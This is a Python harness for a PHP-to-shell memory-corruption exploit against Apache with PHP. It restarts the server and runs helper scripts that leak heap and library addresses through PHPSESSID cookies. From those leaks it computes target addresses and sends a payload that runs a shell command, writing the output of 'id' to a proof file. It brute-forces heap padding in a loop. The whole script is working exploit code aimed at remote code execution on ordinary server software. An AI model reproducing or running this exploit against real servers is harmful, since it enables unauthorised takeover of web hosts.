#!/usr/bin/env python3
import subprocess,re,os,time,sys,urllib.parse
from collections import Counter
WORK="/home/debian/php2shell-work"
def sh(c,timeout=60):
    return subprocess.run(c,shell=True,cwd=WORK,capture_output=True,text=True,timeout=timeout)
def restart():
    sh("sudo -n pkill -9 apache2 2>/dev/null; sleep 0.5")
    sh("sudo -n bash -c '/usr/sbin/apache2ctl -k start' >/dev/null 2>&1")
    for _ in range(30):
        time.sleep(0.1)
        out=sh("pgrep -f '^/usr/sbin/apache2 -k start$'").stdout.split()
        if len(out)>=2: return sorted(map(int,out))
    return []
def child(m):
    out=sh(f"pgrep -P {m} -x apache2").stdout.split()
    return int(out[-1]) if out else 0
def parse_chunk():
    try:
        d=open('/tmp/b_numleak2.resp','rb').read()
        m=re.search(rb'Set-Cookie: PHPSESSID=([^\r\n]*?); path=/',d)
        raw=urllib.parse.unquote_to_bytes(m.group(1).decode('latin1'))
        c=Counter()
        for i in range(len(raw)-8):
            v=int.from_bytes(raw[i:i+8],'little')
            if 0x7f0000000000<=v<0x800000000000: c[v&~0x1fffff]+=1
        b=c.most_common(1)[0][0]
        return b if (b&0x1fffff)==0 else 0
    except Exception: return 0
def parse_lib():
    try:
        d=open('/tmp/b_target.resp','rb').read()
        m=re.search(rb'Set-Cookie: PHPSESSID=([^\r\n]*?); path=/',d)
        raw=urllib.parse.unquote_to_bytes(m.group(1).decode('latin1'))
        p=int.from_bytes(raw[8:16],'little'); b=p-0x613c50
        return b if (p&0x1fffff)==0x13c50 and (b&0x1fffff)==0 else 0
    except Exception: return 0
def trial(P,N1,N2):
    pids=restart()
    if len(pids)<2: return "noapache"
    m=pids[0]; w0=child(m)
    sh("python3 send_a_leak2.py 1001 12 >/dev/null 2>&1",30); time.sleep(0.15)
    sh("python3 b_numleak2.py 892 1 0x1000 >/dev/null 2>&1",30); time.sleep(0.15)
    w1=child(m); ch=parse_chunk()
    sh("python3 send_a_leak3.py 1001 5 39 12 17 >/dev/null 2>&1",30); time.sleep(0.15)
    sh("python3 b_target.py 443 16 983 >/dev/null 2>&1",30); time.sleep(0.15)
    w2=child(m); lib=parse_lib()
    if not ch or not lib: return f"leakfail ch={ch:x} lib={lib:x} w={w1}/{w2}"
    if w1!=w2 or w1!=w0: return f"workerchanged {w0}/{w1}/{w2}"
    proof=f"/tmp/p1_try_{P}_{N1}_{N2}"
    sh(f"rm -f {proof}")
    pads=" ".join(["7:7"]*P)
    sh(f"python3 send_a_pad.py 17 19 3 12 {pads} >/dev/null 2>&1",40); time.sleep(0.3)
    hd=ch+0x6e0d8; zf=lib+0x43a870
    sh(f"python3 send_b_zif.py {N1} {N2} {hex(hd)} {hex(zf)} 'id>{proof}' >/dev/null 2>&1",30)
    time.sleep(0.8)
    w3=child(m)
    if os.path.exists(proof):
        return "PROOF "+open(proof).read().strip()+f" ch={ch:x} lib={lib:x} P={P} N1={N1} w={w0}/{w1}/{w2}/{w3}"
    return f"nop w={w0}/{w1}/{w2}/{w3} ch={ch:x} lib={lib:x}"
if __name__=="__main__":
    P0=int(sys.argv[1]); P1=int(sys.argv[2]); N1=int(sys.argv[3]); N2=int(sys.argv[4]) if len(sys.argv)>4 else 2
    for P in range(P0,P1+1):
        r=trial(P,N1,N2)
        print(f"P={P} N1={N1} {r}",flush=True)
